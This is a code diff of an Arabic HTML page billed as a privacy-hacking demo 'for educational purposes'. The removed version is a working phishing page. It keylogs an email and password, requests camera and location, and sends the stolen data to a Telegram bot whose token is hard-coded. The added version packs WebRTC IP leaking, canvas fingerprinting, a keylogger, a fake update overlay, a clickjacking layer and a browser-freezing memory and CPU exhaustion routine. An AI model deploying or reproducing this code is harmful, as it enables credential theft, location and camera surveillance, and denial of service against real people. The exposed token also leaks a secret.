@@ -2,119 +2,117 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>🚨 مختبر الوعي الأمني - العرض العملي الشامل</title>
+    <title>شامل: مختبر تحليل التهديدات الرقمية</title>
     <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { border: 2px solid #333; padding: 20px; border-radius: 10px; background: #000; position: relative; }
-        .danger-border { border-color: #ff0000; box-shadow: 0 0 15px rgba(255, 0, 0, 0.3); }
-        h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        button { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; transition: 0.3s; }
-        button:hover { background: #aa0000; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #333; border-radius: 5px; }
-        #console { height: 400px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; border: 1px solid #111; }
-        .tag { position: absolute; top: 10px; left: 10px; font-size: 10px; background: #333; padding: 2px 5px; border-radius: 3px; }
+        body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
+        .module { border: 1px solid #333; padding: 15px; margin-bottom: 15px; background: #111; position: relative; }
+        .danger { border-left: 5px solid #ff3e3e; }
+        .log { background: #000; color: #00ff41; height: 100px; overflow-y: auto; border: 1px solid #333; padding: 5px; font-size: 11px; margin-top: 10px; }
+        button { background: #00ff41; color: #000; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold; }
+        .hidden-layer { opacity: 0.5; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: yellow; display: none; }
     </style>
 </head>
 <body>
 
-    <h1 style="text-align: center; color: #ff0000;">🛡️ محاكاة اختراق الخصوصية (لأغراض تعليمية)</h1>
+    <h2>لوحة تحكم المحقق الجنائي (Comprehensive Testing Panel)</h2>
 
-    <div class="grid">
-        <div class="box">
-            <span class="tag">VIEW: VICTIM</span>
-            <h2>📱 واجهة المستخدم</h2>
-            <div style="background: #151515; padding: 20px; border-radius: 10px;">
-                <p style="color: #ffcc00;">⚠️ تم تسجيل الخروج! يرجى إعادة إدخال البيانات للمتابعة:</p>
-                <input type="text" id="email" placeholder="البريد الإلكتروني" oninput="logKey(this.value, 'User')">
-                <input type="password" id="pass" placeholder="كلمة المرور" oninput="logKey(this.value, 'Pass')">
-                <button onclick="launchAttack()">تحديث وتأمين الدخول 🔐</button>
-            </div>
-            <p style="font-size: 11px; color: #555; margin-top: 15px;">* عند الضغط، سيطلب الموقع أذونات (كاميرا وموقع) تحت مسمى "التحقق من الهوية".</p>
-        </div>
-
-        <div class="box danger-border">
-            <span class="tag" style="background: #ff0000;">VIEW: ATTACKER</span>
-            <h2 style="color: #ff0000;">💀 لوحة التحكم (Live)</h2>
-            <div id="console">> بانتظار تفاعل الهدف...</div>
-        </div>
+    <div class="module">
+        <h3>1. جمع البصمات (Canvas & Audio & WebRTC)</h3>
+        <button onclick="runFingerprinting()">بدء استخراج البصمات</button>
+        <div id="log-finger" class="log"></div>
     </div>
 
-<script>
-    // بيانات التلجرام الخاصة بك
-    const BOT_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
-    const CHAT_ID = "8146130042";
-    const consoleDiv = document.getElementById('console');
+    <div class="module">
+        <h3>2. سحب البيانات (Storage & Forms)</h3>
+        <button onclick="simulateExfiltration()">محاكاة سحب التوكنات</button>
+        <div id="log-exfil" class="log"></div>
+    </div>
 
-    function writeLog(msg, color = "#00ff41") {
-        consoleDiv.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        consoleDiv.scrollTop = consoleDiv.scrollHeight;
-    }
+    <div class="module danger">
+        <h3>3. محاكاة التصيد والـ Clickjacking</h3>
+        <button onclick="activatePhishing()">تفعيل واجهة التصيد</button>
+        <button onclick="toggleClickjacking()">محاكاة طبقة Clickjacking</button>
+        <div id="cj-layer" class="hidden-layer">طبقة مخفية فوق الأزرار</div>
+    </div>
 
-    // 1. بصمة الجهاز (صامتة عند التحميل)
-    window.onload = () => {
-        writeLog("🚨 ضحية جديد متصل حالياً.");
-        writeLog(`📡 النظام: ${navigator.platform} | المتصفح: ${navigator.userAgent.split(' ')[0]}`);
-        writeLog(`🌍 اللغة: ${navigator.language} | الدقة: ${window.screen.width}x${window.screen.height}`);
-    };
+    <div class="module danger">
+        <h3>4. إجهاد الموارد (CPU/RAM/WebGL)</h3>
+        <button onclick="startDoS()">بدء الهجوم المتسلسل (تعليق المتصفح)</button>
+    </div>
 
-    // 2. رصد المفاتيح (Keylogging)
-    function logKey(val, type) {
-        writeLog(`⌨️ [LIVE] ${type}: ${val}`, "#ffcc00");
-    }
-
-    // 3. الهجوم الشامل والإرسال للتلجرام
-    async function launchAttack() {
-        writeLog("🧨 تم تفعيل الهجوم الشامل (Full Infiltration)...", "#ff0000");
-
-        try {
-            // طلب الكاميرا والموقع
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            writeLog("✅ تم اختراق الكاميرا بنجاح!", "#ff0000");
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                writeLog(`📍 تم سحب الإحداثيات: ${lat}, ${lon}`, "#ff0000");
-
-                // تجميع البيانات المسروقة
-                const userData = document.getElementById('email').value;
-                const passData = document.getElementById('pass').value;
-                
-                const report = `🚨 *تقرير اختراق جديد* 🚨\n\n` +
-                               `📧 الحساب: \`${userData}\`\n` +
-                               `🔑 الباسورد: \`${passData}\`\n` +
-                               `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
-                               `📱 الجهاز: ${navigator.platform}\n` +
-                               `🌐 المتصفح: ${navigator.userAgent.substring(0, 50)}...`;
-
-                writeLog("📡 جاري شحن البيانات إلى سيرفر التلجرام...");
-
-                // عملية الإرسال الحقيقية
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: report,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                if (response.ok) {
-                    writeLog("🔥 تم استلام البيانات على هاتف المهاجم بنجاح!", "#ff0000");
-                } else {
-                    writeLog("⚠️ فشل الإرسال (تأكد من الـ Token والأيدي).", "#fff");
-                }
-
-                // إغلاق الكاميرا بعد انتهاء المهمة
-                stream.getTracks().forEach(track => track.stop());
-            });
-
-        } catch (err) {
-            writeLog("❌ الضحية رفض الأذونات. الهجوم فشل في سحب الكاميرا والموقع.", "#fff");
+    <script>
+        function log(id, msg) {
+            const box = document.getElementById(id);
+            box.innerHTML += `> ${msg}<br>`;
+            box.scrollTop = box.scrollHeight;
         }
-    }
-</script>
+
+        // --- ميزات البصمة و WebRTC ---
+        async function runFingerprinting() {
+            log('log-finger', "جاري فحص WebRTC IP Leak...");
+            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+            pc.onicecandidate = (e) => {
+                if (e.candidate) log('log-finger', `تم كشف IP محلي: ${e.candidate.candidate.split(' ')[4]}`);
+            };
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+
+            // Canvas Fingerprinting
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillText("Forensic-Test", 10, 10);
+            log('log-finger', `بصمة Canvas المبدئية: ${canvas.toDataURL().hash || 'Generated'}`);
+            
+            // Audio Fingerprinting Simulation
+            log('log-finger', "تم محاكاة بصمة الصوت (AudioContext)...");
+        }
+
+        // --- سحب معلومات المتصفح والتخزين ---
+        function simulateExfiltration() {
+            log('log-exfil', `المتصفح: ${navigator.userAgent}`);
+            log('log-exfil', `اللغة: ${navigator.language} | الذاكرة التقريبية: ${navigator.deviceMemory}GB`);
+            
+            // محاكاة سحب LocalStorage & SessionStorage
+            localStorage.setItem('dummy_session', '7a8b9c10d11e12f');
+            log('log-exfil', `تم الوصول لـ LocalStorage: ${localStorage.getItem('dummy_session')}`);
+            
+            // محاكاة Keylogging (رصد مفاتيح)
+            document.onkeydown = (e) => log('log-exfil', `تم رصد ضغطة مفتاح: ${e.key}`);
+        }
+
+        // --- التصيد والهندسة الاجتماعية ---
+        function activatePhishing() {
+            const overlay = document.createElement('div');
+            overlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; display:flex; justify-content:center; align-items:center;";
+            overlay.innerHTML = `
+                <div style="background:#fff; padding:30px; border-radius:10px; text-align:center; color:#000;">
+                    <h3>تنبيه أمني: يرجى تحديث المتصفح</h3>
+                    <p>اضغط لتحميل التحديث الأمني الأخير (Drive-by Simulation)</p>
+                    <button style="background:blue; color:#fff;" onclick="alert('محاكاة تحميل ملف خبيث...'); location.reload();">تحميل الآن</button>
+                </div>`;
+            document.body.appendChild(overlay);
+        }
+
+        function toggleClickjacking() {
+            const layer = document.getElementById('cj-layer');
+            layer.style.display = layer.style.display === 'none' ? 'block' : 'none';
+        }
+
+        // --- استهلاك الموارد (DoS) ---
+        function startDoS() {
+            alert("سيبدأ الآن استهلاك الذاكرة والمعالج. قد ينهار المتصفح.");
+            
+            // 1. استهلاك الذاكرة (Memory Exhaustion)
+            let heap = [];
+            setInterval(() => {
+                for(let i=0; i<10000; i++) heap.push(new Array(1000));
+            }, 100);
+
+            // 2. حلقة لا نهائية (CPU Exhaustion)
+            while(true) {
+                console.log("إجهاد المعالج...");
+            }
+        }
+    </script>
 </body>
 </html>
